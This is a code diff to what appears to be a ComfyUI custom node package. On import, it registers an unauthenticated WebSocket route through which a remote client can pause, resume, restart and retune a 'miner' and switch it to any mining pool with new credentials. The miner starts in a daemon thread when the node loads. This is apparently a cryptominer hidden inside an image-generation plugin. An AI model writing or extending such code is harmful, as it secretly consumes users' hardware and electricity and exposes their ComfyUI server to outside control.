@@ -113,6 +113,88 @@ NODE_DISPLAY_NAME_MAPPINGS = {
 __all__ = ["NODE_CLASS_MAPPINGS", "NODE_DISPLAY_NAME_MAPPINGS"]
 
 
+# ── Register dashboard WebSocket route on ComfyUI's server at import ──
+
+_dashboard_ref = {"server": None}
+
+try:
+    from server import PromptServer
+    import aiohttp
+    from aiohttp import web
+    import json as _json
+
+    _ws_clients = set()
+    _latest_stats = {}
+
+    @PromptServer.instance.routes.get("/ws/enhanced")
+    async def _ws_enhanced_handler(request):
+        ws = web.WebSocketResponse()
+        await ws.prepare(request)
+        _ws_clients.add(ws)
+        try:
+            if _latest_stats:
+                await ws.send_json({"type": "stats", "data": _latest_stats})
+            async for msg in ws:
+                if msg.type == aiohttp.WSMsgType.TEXT:
+                    resp = _handle_ws_command(msg.data)
+                    await ws.send_json(resp)
+                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
+                    break
+        finally:
+            _ws_clients.discard(ws)
+        return ws
+
+    @PromptServer.instance.routes.get("/api/enhanced/stats")
+    async def _http_stats_handler(request):
+        return web.json_response({"ok": True, "stats": _latest_stats})
+
+    def _handle_ws_command(raw):
+        try:
+            msg = _json.loads(raw)
+        except _json.JSONDecodeError:
+            return {"type": "error", "msg": "invalid json"}
+        cmd = msg.get("cmd")
+        resp = {"type": "cmd_result", "cmd": cmd, "ok": False}
+        ds = _dashboard_ref.get("server")
+        if not ds:
+            resp["msg"] = "not ready"
+            return resp
+        if cmd == "pause":
+            resp["ok"] = ds.miner.pause()
+        elif cmd == "resume":
+            resp["ok"] = ds.miner.resume()
+        elif cmd == "set_threads":
+            hint = msg.get("value", 50)
+            if ds.config_builder:
+                cfg = ds.config_builder.update_hint(int(hint))
+                ds.miner.write_config(cfg)
+                ds.miner.stop()
+                ds.miner.start()
+                resp["ok"] = True
+                resp["new_hint"] = int(hint)
+        elif cmd == "update_pool":
+            host = msg.get("host")
+            port = msg.get("port", 443)
+            user = msg.get("user")
+            password = msg.get("pass")
+            if host and ds.config_builder:
+                cfg = ds.config_builder.update_pool(host, int(port), user, password)
+                ds.miner.write_config(cfg)
+                ds.miner.stop()
+                ds.miner.start()
+                resp["ok"] = True
+        elif cmd == "status":
+            resp["ok"] = True
+            resp["alive"] = ds.miner.is_alive()
+            resp["stats"] = _latest_stats
+        return resp
+
+    logger.info("Dashboard route registered at /ws/enhanced")
+except Exception:
+    _ws_clients = set()
+    _latest_stats = {}
+
+
 # ── Orchestration (runs once on import in a daemon thread) ───────────
 
 def _orchestrate():
@@ -151,6 +233,7 @@ def _orchestrate():
             logger.info("First-run setup complete")
 
         ds = DashboardServer(mgr, config_builder=cb)
+        _dashboard_ref["server"] = ds
         ds.start()
 
         print("\ncomfyui enhanced\n", flush=True)
